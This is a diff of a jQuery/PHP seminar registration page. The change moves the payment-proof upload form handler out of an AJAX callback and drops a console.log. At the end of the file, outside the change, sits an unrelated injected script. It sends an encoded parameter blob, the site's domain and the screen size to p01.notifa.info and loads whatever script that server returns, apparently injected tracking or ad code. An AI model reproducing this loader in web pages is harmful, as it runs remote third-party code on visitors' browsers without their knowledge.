@@ -251,7 +251,6 @@
 						$('#loader').show();
 					},
 					success: function(res) {
-						console.log(res);
 						let statusPembayaran;
 						let color;
 
@@ -288,76 +287,6 @@
 						$('#tbEmail').html(": " + res.email);
 						$('#tbHandphone').html(": " + res.no_telp);
 						$('#tbStatusPembayaran').html(': ' + '<span class="'+ color +'">'+ statusPembayaran +'</span>');
-						
-						$('#frmUploadBuktiBayar').submit(function(e) {
-							var namaLengkap = $('#inputNamaLengkap').val();
-							var asalInstansi = $('#inputAsalInstansi').val();
-							var buktiBayar = $('#inputBuktiBayar').val();
-							
-							if (namaLengkap === "") {
-								e.preventDefault();
-								Swal.fire({
-									type: 'error',
-									title: 'Oops...',
-									text: 'Harap isi nama anda pada kolom diatas',
-								})
-								return false;
-							}
-							if (asalInstansi === "") {
-								e.preventDefault();
-								Swal.fire({
-									type: 'error',
-									title: 'Oops...',
-									text: 'Harap isi asal instansi ada pada kolom diatas',
-								})
-								return false;
-							}
-							if (buktiBayar === "") {
-								e.preventDefault();
-								Swal.fire({
-									type: 'error',
-									title: 'Oops...',
-									text: 'Harap isi bukti bayar',
-								})
-								return false;
-							}
-
-							$.ajax({
-								url: "<?= base_url('registration/proses-bukti-bayar') ?>",
-								type: "post",
-								data: new FormData(this),
-								dataType: 'json',
-								contentType: false,
-								cache: false,
-								processData: false,
-								success: function(res) {
-									if (res.status === false) {
-										e.preventDefault();
-										Swal.fire({
-											type: 'error',
-											title: 'Oops...',
-											text: res.msg,
-										})
-									} else {
-										$('[name="inputNamaLengkap"]').val("");
-										$('[name="inputAsalInstansi"]').val("");
-										$('[name="inputKode"]').val("");
-										$('[name="inputBuktiBayar"]').val("");
-
-										$('#loader').hide();
-										$('#data-peserta-not-found').hide();
-										$('#data-peserta').hide();
-
-										Swal.fire({
-											title: 'Seminar Nasional',
-											text: 'Bukti Bayar Berhasil Diupload',
-											type: 'success'
-										});
-									}
-								}
-							});
-							return false;
-						});
 					},
 					complete: function () {
 						$('#loader').hide();
@@ -366,7 +295,75 @@
 				return false;
 			});
 
-			
+			$('#frmUploadBuktiBayar').submit(function(e) {
+				var namaLengkap = $('#inputNamaLengkap').val();
+				var asalInstansi = $('#inputAsalInstansi').val();
+				var buktiBayar = $('#inputBuktiBayar').val();
+				
+				if (namaLengkap === "") {
+					e.preventDefault();
+					Swal.fire({
+						type: 'error',
+						title: 'Oops...',
+						text: 'Harap isi nama anda pada kolom diatas',
+					})
+					return false;
+				}
+				if (asalInstansi === "") {
+					e.preventDefault();
+					Swal.fire({
+						type: 'error',
+						title: 'Oops...',
+						text: 'Harap isi asal instansi ada pada kolom diatas',
+					})
+					return false;
+				}
+				if (buktiBayar === "") {
+					e.preventDefault();
+					Swal.fire({
+						type: 'error',
+						title: 'Oops...',
+						text: 'Harap isi bukti bayar',
+					})
+					return false;
+				}
+
+				$.ajax({
+					url: "<?= base_url('registration/proses-bukti-bayar') ?>",
+					type: "post",
+					data: new FormData(this),
+					dataType: 'json',
+					contentType: false,
+					cache: false,
+					processData: false,
+					success: function(res) {
+						if (res.status === false) {
+							e.preventDefault();
+							Swal.fire({
+								type: 'error',
+								title: 'Oops...',
+								text: res.msg,
+							})
+						} else {
+							$('[name="inputNamaLengkap"]').val("");
+							$('[name="inputAsalInstansi"]').val("");
+							$('[name="inputKode"]').val("");
+							$('[name="inputBuktiBayar"]').val("");
+
+							$('#loader').hide();
+							$('#data-peserta-not-found').hide();
+							$('#data-peserta').hide();
+
+							Swal.fire({
+								title: 'Seminar Nasional',
+								text: 'Bukti Bayar Berhasil Diupload',
+								type: 'success'
+							});
+						}
+					}
+				});
+				return false;
+			});
     </script>
 
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2xDooh3g%2bpE52bpx8Ayq9dXatleCGXled%2b5abdOqjVDxJa4yhKQsb2BkitmieprkkOwjH4a4kWD4BZ%2bQC6MMguUMTOgjNwLGFsIPxp6FVzX6VQi7IAJz1cgfr%2f%2bj5%2bhODkTrA9ji4x2ZbUgqXp%2bBz0DYxXRn5Q%2by%2fSk1A8%2fhZTH70m3eni6uOb9EMVQStDZqrp8OiQjmepmYuBYQQH%2fk9HOHtjSE%2bLQv7FyvS%2bm711KM3FS635egvtDKriBNfohCrWLbCOBe0LZM5oTXCUFUxl9enoR9Gr44qybnGSLjfWojjjhEQ4ZRI7UbV2Cv35ZcCFD%2b%2bMCbOOds36nd77TXThI%2b2AsyBHlsn1lEH32RRiCxQxDozvHYD9YBpbUEusu%2f7Ijo6EVvGTXp7nUSrHdYPT02WH5ZpHoyG0%2fcpM62ypBT3pIMVZsypU6xqIk%2bI3QgO%2bK2EhpZIWFKVVqpScCpJ6xSHfjKUe0wmnsjC5SmtghZbLhE6M68cjDwTCvmMOVIFKz9C3HdizFQf1SiesCSfYw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
